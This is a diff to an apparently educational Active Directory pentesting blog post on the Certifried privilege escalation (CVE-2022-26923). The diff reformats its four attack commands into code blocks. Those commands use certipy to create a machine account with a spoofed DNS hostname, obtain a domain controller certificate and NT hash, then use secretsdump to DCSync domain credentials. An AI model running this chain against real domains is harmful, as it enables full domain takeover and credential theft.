@@ -39,7 +39,10 @@ title:  "AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)"
 
 # Attack Demonstration
 ## 1. Joining A Machine Account to The Domain with A Spoofed DNSHostname
-**Command:** `certipy account create <DOMAIN_FQDN>/<AD_USER>@<DC_IP> -user '<NEW_COMPUTER_NAME>' -dns <DC_FQDN>`
+**Command:** 
+```bash
+certipy account create <DOMAIN_FQDN>/<AD_USER>@<DC_IP> -user '<NEW_COMPUTER_NAME>' -dns <DC_FQDN>
+```
 
 ![creating-computer-with-spoofed-dns-hostname](/assets/Certifried/creating-computer-with-spoofed-dns-hostname.jpg)
 
@@ -52,19 +55,28 @@ This can be done by visiting the `/certsrv` web directory on the server with ADC
 
 ![finding-out-the-ca-name](/assets/Certifried/finding-out-the-ca-name.jpg)
 
-**Command:** `certipy req -dc-ip <DC_IP> <DOMAIN_FQDN>/'<ADDED_COMPUTER_NAME_ENDING_WITH_DOLLAR_SIGN>'@<DC_IP> -ca <CA_NAME> -template Machine`
+**Command:** 
+```bash
+certipy req -dc-ip <DC_IP> <DOMAIN_FQDN>/'<ADDED_COMPUTER_NAME_ENDING_WITH_DOLLAR_SIGN>'@<DC_IP> -ca <CA_NAME> -template Machine
+```
 
 Password = the same password generated from the computer creation in the previous step
 
 ![requesting-dc-cert](/assets/Certifried/requesting-dc-cert.jpg)
 
 ## 3. Using the Domain Controller's Certificate To Get its NTLM Hash
-**Command:** `certipy auth -pfx <GENERATED_PFX_CERTIFICATE>`
+**Command:** 
+```bash
+certipy auth -pfx <GENERATED_PFX_CERTIFICATE>
+```
 
 ![got-nt-hash-for-dc](/assets/Certifried/got-nt-hash-for-dc.jpg)
 
 ## 4. Performing DCSync As The Impersonated Domain Controller
-**Command:** `secretsdump.py -just-dc <DOMAIN_FQDN>/'<DC_NAME_ENDING_WITH_DOLLAR_SIGN>'@<DC_IP> -hashes :<RETRIEVED_HASH>`
+**Command:** 
+```bash
+secretsdump.py -just-dc <DOMAIN_FQDN>/'<DC_NAME_ENDING_WITH_DOLLAR_SIGN>'@<DC_IP> -hashes :<RETRIEVED_HASH>
+```
 
 ![dc-sync-with-dc-ntlm-hash](/assets/Certifried/dc-sync-with-dc-ntlm-hash.jpg)
 
